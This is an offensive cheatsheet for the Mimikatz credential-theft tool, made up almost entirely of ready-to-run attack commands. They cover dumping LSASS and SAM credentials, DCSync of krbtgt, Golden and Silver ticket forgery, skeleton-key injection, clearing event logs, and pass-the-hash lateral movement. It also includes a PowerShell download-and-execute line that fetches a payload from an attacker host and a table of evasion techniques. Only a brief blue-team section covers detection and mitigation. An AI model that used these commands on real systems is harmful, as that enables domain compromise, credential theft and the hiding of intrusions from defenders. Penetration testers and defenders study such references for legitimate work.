# Mimikatz — Comprehensive Cheatsheet

## Quick Start

```bash
# Upload to target
mimikatz.exe

# Enable debug privilege + dump all credentials
privilege::debug
sekurlsa::logonpasswords
```

---

## Privilege Escalation

```bash
privilege::debug
```
**Explanation:** Enables SeDebugPrivilege required for LSASS access.

```bash
token::elevate
```
**Explanation:** Elevates to SYSTEM token via token duplication.

```bash
privilege::token /elevate
```
**Explanation:** Alternative token elevation method.

---

## Credential Dumping

### Sekurlsa Module — Memory Credentials

```bash
sekurlsa::logonpasswords
```
**Explanation:** Extracts plaintext passwords, NTLM hashes, and Kerberos tickets from all logon sessions.

```bash
sekurlsa::msv
```
**Explanation:** Extracts MSV1_0 (NTLM) credentials only.

```bash
sekurlsa::wdigest
```
**Explanation:** Extracts WDigest plaintext passwords. Requires WDigest UseLogonCredential=1 in registry.

```bash
sekurlsa::kerberos
```
**Explanation:** Extracts Kerberos tickets from memory.

```bash
sekurlsa::tspkg
```
**Explanation:** Extracts TsPkg credentials (Terminal Services).

```bash
sekurlsa::credman
```
**Explanation:** Extracts Credential Manager stored credentials.

```bash
sekurlsa::ekeys
```
**Explanation:** Extracts ALL Kerberos encryption keys (RC4, AES128, AES256, DES).

```bash
sekurlsa::ticket /export
```
**Explanation:** Exports all Kerberos tickets to .kirbi files.

```bash
sekurlsa::tickets /export
```
**Explanation:** Alternative ticket export from LSASS memory.

```bash
sekurlsa::pth /user:administrator /ntlm:b4b9b02e6f09a9bb312324d4b798e291 /domain:target.example.com /run:cmd.exe
```
**Explanation:** Overpass-the-Hash — creates a new logon session with supplied NTLM hash, launches cmd.exe under that context.

```bash
sekurlsa::pth /user:administrator /ntlm:b4b9b02e6f09a9bb312324d4b798e291 /domain:target.example.com /run:powershell.exe
```
**Explanation:** Overpass-the-Hash with PowerShell.

```bash
sekurlsa::pth /user:administrator /aes256:long_aes_key... /domain:target.example.com /run:cmd.exe
```
**Explanation:** Overpass-the-Hash using AES256 key (stealthier than RC4).

### Lsadump Module — Database Extraction

```bash
lsadump::sam
```
**Explanation:** Extracts local account NTLM hashes from SAM database. Requires SYSTEM-level access.

```bash
lsadump::sam /system:SYSTEM.hiv /sam:SAM.hiv
```
**Explanation:** Offline SAM dump from extracted registry hives.

```bash
lsadump::secrets
```
**Explanation:** Extracts LSA secrets (service account passwords, auto-logon credentials).

```bash
lsadump::cache
```
**Explanation:** Extracts cached domain credentials (MSCACHE2/MSCACHE3).

```bash
lsadump::lsa /patch
```
**Explanation:** Dumps LSA secrets by patching LSASS memory (requires elevated privileges).

```bash
lsadump::lsa /inject
```
**Explanation:** Dumps LSA by injecting into LSASS.

```bash
lsadump::dcsync /user:krbtgt
```
**Explanation:** DCSync — replicates krbtgt hash from domain controller using MS-DRSR protocol. Requires domain admin or DCReplicationRights.

```bash
lsadump::dcsync /user:target.example.com\administrator
```
**Explanation:** DCSync for a specific domain user account.

```bash
lsadump::dcsync /user:target.example.com\administrator /dc:dc01.target.example.com
```
**Explanation:** DCSync targeting a specific domain controller.

```bash
lsadump::dcsync /user:target.example.com\krbtgt /domain:target.example.com
```
**Explanation:** DCSync with explicit domain specification.

```bash
lsadump::dcsync /all /csv
```
**Explanation:** DCSync all accounts, output in CSV format.

```bash
lsadump::trust /patch
```
**Explanation:** Dump inter-realm trust keys for forest trust attacks.

---

## Kerberos Attacks

### Golden Ticket (Forged TGT)

```bash
kerberos::golden /user:administrator /domain:target.example.com /sid:S-1-5-21-3623811015-3361044348-30300820-1013 /krbtgt:b4b9b02e6f09a9bb312324d4b798e291 /ptt
```
**Explanation:** Forges a Golden Ticket using the krbtgt NTLM hash, injects into current session. Grants access to any domain resource.

```bash
kerberos::golden /user:administrator /domain:target.example.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi
```
**Explanation:** Forges Golden Ticket and saves to file for later use.

```bash
kerberos::golden /user:administrator /domain:target.example.com /sid:S-1-5-21-... /krbtgt:hash /id:500 /groups:512 /ptt
```
**Explanation:** Golden Ticket with explicit RID 500 (built-in admin) and Domain Admins group.

```bash
kerberos::golden /user:administrator /domain:target.example.com /sid:S-1-5-21-... /krbtgt:hash /extra-sid:S-1-5-21-...-519 /ptt
```
**Explanation:** Golden Ticket with Enterprise Admins SID for cross-domain access.

### Silver Ticket (Forged Service Ticket)

```bash
kerberos::silver /service:cifs /user:administrator /domain:target.example.com /sid:S-1-5-21-... /rc4:b4b9b02e6f09a9bb312324d4b798e291 /ptt
```
**Explanation:** Forges Silver Ticket for CIFS service, enabling SMB access without touching DC.

```bash
kerberos::silver /service:http/dc01.target.example.com /user:administrator /domain:target.example.com /sid:S-1-5-21-... /rc4:hash /ptt
```
**Explanation:** Silver Ticket for HTTP service (WinRM/WSMAN).

```bash
kerberos::silver /service:ldap/dc01.target.example.com /user:administrator /domain:target.example.com /sid:S-1-5-21-... /rc4:hash /ptt
```
**Explanation:** Silver Ticket for LDAP service.

```bash
kerberos::silver /service:mssql/sqldb01.target.example.com /user:administrator /domain:target.example.com /sid:S-1-5-21-... /rc4:hash /ptt
```
**Explanation:** Silver Ticket for MSSQL service.

### Ticket Operations

```bash
kerberos::list
```
**Explanation:** Lists all Kerberos tickets in current logon session.

```bash
kerberos::list /export
```
**Explanation:** Exports all tickets to .kirbi files.

```bash
kerberos::ptt ticket.kirbi
```
**Explanation:** Pass-the-Ticket — injects a .kirbi ticket into current session.

```bash
kerberos::purge
```
**Explanation:** Purges all Kerberos tickets from current session.

```bash
kerberos::hash /password:Password123 /domain:target.example.com
```
**Explanation:** Generates NTLM hash from plaintext password.

```bash
kerberos::hash /password:Password123 /user:administrator /domain:target.example.com
```
**Explanation:** Generates Kerberos keys for a specific user.

```bash
kerberos::golden /user:administrator /domain:target.example.com /sid:S-1-5-21-... /krbtgt:hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
```
**Explanation:** Golden Ticket with custom validity window (600 min, renewal 10080 min).

---

## Skeleton Key

```bash
misc::skeleton
```
**Explanation:** Injects skeleton key into LSASS. After injection, "mimikatz" works as password for ALL accounts. Default password: "mimikatz". Detected by reboot.

```bash
misc::memssp
```
**Explanation:** Injects a credential logger into LSASS. Captures plaintext passwords and hashes for future logons without persistent skeleton key.

---

## Crypto Operations

```bash
crypto::certificates /export
```
**Explanation:** Exports all certificates from certificate stores.

```bash
crypto::keys /export
```
**Explanation:** Exports private keys from certificate stores.

```bash
crypto::capi
```
**Explanation:** Patches CryptoAPI to export non-exportable keys.

```bash
crypto::cng
```
**Explanation:** Patches CNG (Cryptography Next Generation) key isolation service.

```bash
crypto::tokencap
```
**Explanation:** Dumps token impersonation capabilities.

---

## Vault Operations

```bash
vault::cred
```
**Explanation:** Lists stored credentials in Windows Vault.

```bash
vault::list
```
**Explanation:** Lists all vault entries.

```bash
vault::cred /patch
```
**Explanation:** Patches vault to extract credentials.

---

## Log Clearing

```bash
event::clear
```
**Explanation:** Clears Windows Security event log.

```bash
event::drop
```
**Explanation:** Prevents new events from being logged.

---

## WDigest Enabling

```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
**Explanation:** Enables WDigest plaintext credential storage. Requires reboot. After this, next logon stores password in memory for sekurlsa::wdigest extraction.

---

## Offline / Remote Operations

### Extract Hives Offline

```bash
reg save HKLM\SAM C:\temp\SAM.hiv
reg save HKLM\SYSTEM C:\temp\SYSTEM.hiv
reg save HKLM\SECURITY C:\temp\SECURITY.hiv
```
**Explanation:** Exports SAM, SYSTEM, and SECURITY registry hives for offline analysis.

```bash
lsadump::sam /system:C:\temp\SYSTEM.hiv /sam:C:\temp\SAM.hiv
lsadump::secrets /system:C:\temp\SYSTEM.hiv /security:C:\temp\SECURITY.hiv
```
**Explanation:** Offline credential extraction from saved hives.

### DCSync from Linux (Impacket)

```bash
impacket-secretsdump target.example.com/administrator:b4b9b02e6f09a9bb312324d4b798e291@dc01.target.example.com
```
**Explanation:** Equivalent DCSync using impacket from Linux (no Windows needed).

```bash
impacket-secretsdump -just-dc-ntlm target.example.com/administrator:'Password123'@dc01.target.example.com
```
**Explanation:** DCSync for NTLM hashes only.

---

## PowerShell Execution (Memory-Only)

```powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker_IP/mimikatz.ps1')
Invoke-Mimikatz -Command "privilege::debug; sekurlsa::logonpasswords"
```
**Explanation:** Executes mimikatz entirely in memory, avoiding disk write.

```powershell
# Invoke-Mimikatz with specific commands
Invoke-Mimikatz -Command "privilege::debug; sekurlsa::logonpasswords; lsadump::sam; kerberos::list /export"
```
**Explanation:** Chain multiple mimikatz commands in one PowerShell invocation.

---

## Lateral Movement Workflows

### Workflow: Credential Dump → Pass-the-Hash

```bash
# Step 1: Dump credentials on compromised host
privilege::debug
sekurlsa::logonpasswords

# Step 2: Use NTLM hash to access other hosts
sekurlsa::pth /user:administrator /ntlm:b4b9b02e6f09a9bb312324d4b798e291 /domain:target.example.com /run:cmd.exe

# Step 3: In new cmd, access target
dir \\fileserver01\C$
```

### Workflow: DCSync → Golden Ticket → Persistence

```bash
# Step 1: DCSync krbtgt
lsadump::dcsync /user:target.example.com\krbtgt

# Step 2: Forge Golden Ticket
kerberos::golden /user:administrator /domain:target.example.com /sid:S-1-5-21-... /krbtgt:hash /ptt

# Step 3: Access any domain resource without credentials
dir \\dc01.target.example.com\C$
```

### Workflow: Overpass-the-Hash → Kerberos Access

```bash
# Step 1: Get TGT from NTLM hash
sekurlsa::pth /user:administrator /ntlm:b4b9b02e6f09a9bb312324d4b798e291 /domain:target.example.com /run:cmd.exe

# Step 2: Request service ticket for specific SPN
asktgs /ticket:TGT_BASE64 /service:cifs/fileserver01.target.example.com /ptt
```

---

## Integration with Other Tools

### Metasploit

```bash
# Upload mimikatz
upload /path/to/mimikatz.exe C:\\Windows\\Temp\\

# Execute mimikatz
execute -f C:\\Windows\\Temp\\mimikatz.exe -i -H

# Or use kiwi extension
load kiwi
creds_all
```

### CrackMapExec / NetExec

```bash
# Use dumped hash with nxc
nxc smb 192.168.1.0/24 -u administrator -H 'b4b9b02e6f09a9bb312324d4b798e291'

# Or with crackmapexec
crackmapexec smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291'
```

### Impacket (psexec/wmiexec)

```bash
# Use captured hash with impacket
impacket-psexec target.example.com/administrator:b4b9b02e6f09a9bb312324d4b798e291@192.168.1.10

impacket-wmiexec target.example.com/administrator:b4b9b02e6f09a9bb312324d4b798e291@192.168.1.10
```

### Evil-WinRM

```bash
evil-winrm -i 192.168.1.10 -u administrator -H 'b4b9b02e6f09a9bb312324d4b798e291'
```

---

## Opsec Considerations

### Detection Indicators

| Indicator | Event ID | Source |
|-----------|----------|--------|
| LSASS memory access | Sysmon 10 | Host |
| Privilege elevation | 4672 | Windows Event Log |
| New logon session | 4624 | Windows Event Log |
| Process creation | 4688 | Windows Event Log |
| Kerberos ticket requests | 4768, 4769 | DC Event Log |
| WDigest registry change | 4657 | Windows Event Log |

### Evasion Techniques

| Technique | Method |
|-----------|--------|
| Memory-only execution | PowerShell Invoke-Mimikatz |
| Avoid LSASS handle | Use Rubeus for Kerberos ops |
| AES instead of RC4 | sekurlsa::ekeys for AES keys |
| Avoid disk writes | Run from memory, delete .kirbi |
| Use /opsec flag | Rubeus asktgt /opsec |

### Mitigation (Blue Team)

| Control | Implementation |
|---------|----------------|
| Credential Guard | Enable Windows Credential Guard |
| LSA Protection | `reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f` |
| Disable WDigest | `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f` |
| Monitor LSASS | Sysmon Event ID 10 |
| Deception tokens | Use honey credentials |

---

## Common Error Resolution

| Error | Cause | Fix |
|-------|-------|-----|
| `privilege::debug failed` | Not running as admin | Run as Administrator |
| `sekurlsa::logonpasswords failed` | RunAsPPL enabled | Use `lsadump::sam` or bypass PPL |
| `lsadump::dcsync failed` | Insufficient privileges | Need domain admin or DCReplication |
| `kerberos::golden failed` | Wrong SID or krbtgt hash | Verify domain SID and krbtgt NTLM |
| `sekurlsa::pth` opens wrong window | Using `/run` incorrectly | Ensure full path to executable |

---

## Quick Reference — Hash Formats

| Type | Example |
|------|---------|
| NTLM (rc4_hmac) | `b4b9b02e6f09a9bb312324d4b798e291` |
| LM:NTLM | `aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291` |
| AES256 | `long_hex_string_64_chars...` |
| DES | `short_hex_string_16_chars` |

---

## File Locations

| File | Purpose |
|------|---------|
| `mimikatz.exe` | Main executable |
| `mimilib.dll` | SSP library for password logging |
| `mimikatz.ps1` | PowerShell version |
| `mimidrv.sys` | Kernel driver (legacy) |
| `mimidrv2.sys` | Updated kernel driver |

---

## Reference Links

- **GitHub:** https://github.com/gentilkiwi/mimikatz
- **Wiki:** https://github.com/gentilkiwi/mimikatz/wiki
- **HackTricks:** https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/mimikatz
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
